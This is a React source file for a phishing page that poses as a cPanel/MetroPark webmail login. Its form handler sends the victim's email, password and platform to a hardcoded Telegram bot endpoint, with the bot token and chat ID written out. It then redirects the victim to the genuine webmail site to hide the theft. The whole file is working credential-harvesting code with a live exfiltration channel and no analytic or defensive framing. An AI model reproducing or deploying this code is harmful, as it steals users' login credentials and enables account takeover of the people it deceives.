import React from 'react';
import './home.css'

import logo from './logo.png';
import ardmore from './ardmore.png';
import { useState } from 'react';
import axios from 'axios';
import metro from './metro.svg';
import cpanel from './cpanel.png';

function Home(){

    const[email, setEmail] = useState("");

    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("MetroPark")

    const[showError, setShowError] = useState(false);



    async function handleSubmit(e){
        e.preventDefault();
    
    
        try {
           
    
          const response =   await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                chat_id: 6150403557,
                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
              });
    
    
        
            // Handle success
         
    
            if(response.status == 200){
               // console.log(response.data.message);
    
              
               window.location.href = 'https://metroparks.net:2096/';
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    
        
    }
    

    

    return (
        <>
            <div className='firstdiv'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            </div>

            <div className='secondiv col-md-5 m-auto px-4'>
                <div className='text-center'>
                <img src={metro} className="mylogo" />

                </div>


                {/* form */}



                <form onSubmit={handleSubmit} className='px-4 mt-4'>
                   


                <div class="col-auto">
      <label class="" for="inlineFormInputGroup">Email Address</label>
      <div class="input-group mb-2">
        <div class="input-group-prepend">
          <div class="input-group-text"><i className='fa fa-user'></i></div>
        </div>
        <input type="email" onChange={function(e){
            setEmail(e.target.value);
        }} value={email} class="form-control" id="inlineFormInputGroup" placeholder="Enter your email address"/>
      </div>
    </div>

<br/>

    <div class="col-auto">
      <label class="" for="inlineFormInputGroup">Password</label>
      <div class="input-group mb-2">
        <div class="input-group-prepend">
          <div class="input-group-text"><i className='fa fa-lock'></i></div>
        </div>
        <input type="password" onChange={function(e){
            setPassword(e.target.value);
        }} value={password} class="form-control" id="inlineFormInputGroup" placeholder="Enter your email password"/>
      </div>
    </div>

    


    <br/>


    <div className='text-center'>

        <button className='btn mybutton py-2 w-100'>Login</button>

    </div>


                 



                  
                    



                    </form>

            </div>

<br/>
<br/>

            <div className='myflex col-md-8 m-auto'>

               
                <p>English</p>
                <p>العربية</p>
                <p>čeština</p>
                <p>dansk</p>
                <p>Deutsch</p>
                <p> Ελληνικά</p>
                <p>español</p>
                <p>español</p>
                <p>latinoamericano …</p>

            </div>


            <div className='thirdiv text-center'>

                <img src={cpanel} style={{
                    width:"30px",
                }}  />

                <p>Copyright© 2024 cPanel, L.L.C. <br/>
Privacy Policy</p>

            </div>


        
        </>
    );

}

export default Home;